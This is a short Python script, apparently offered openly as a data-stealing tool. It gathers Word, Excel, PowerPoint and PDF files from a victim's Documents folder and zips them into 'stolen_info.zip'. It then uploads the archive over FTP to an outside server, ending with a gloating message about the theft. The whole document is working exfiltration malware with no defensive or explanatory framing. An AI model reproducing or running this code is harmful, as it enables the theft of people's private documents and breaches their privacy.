import os
import shutil
import zipfile
import ftplib

src_dir = "C:\\Users\\Victim\\Documents"
dest_dir = "C:\\Users\\You\\AppData\\Local\\Temp\\random_folder"

for root, dirs, files in os.walk(src_dir):
    for file in files:
        if file.endswith((".doc", ".docx", ".xls", ".xlsx", ".pdf", ".ppt", ".pptx")):
            src_path = os.path.join(root, file)
            dest_path = os.path.join(dest_dir, file)
            shutil.copy2(src_path, dest_path)

zip_name = "stolen_info.zip"
zip_path = os.path.join(dest_dir, zip_name)
with zipfile.ZipFile(zip_path, mode="w") as zip_file:
    for root, dirs, files in os.walk(dest_dir):
        for file in files:
            zip_file.write(os.path.join(root, file), file)

ftp = ftplib.FTP("ftp.example.com")
ftp.login("username", "password")
with open(zip_path, "rb") as file:
    ftp.storbinary(f"STOR {zip_name}", file)

print("Information stolen and uploaded to FTP server. Enjoy your ill-gotten gains! 🤑")
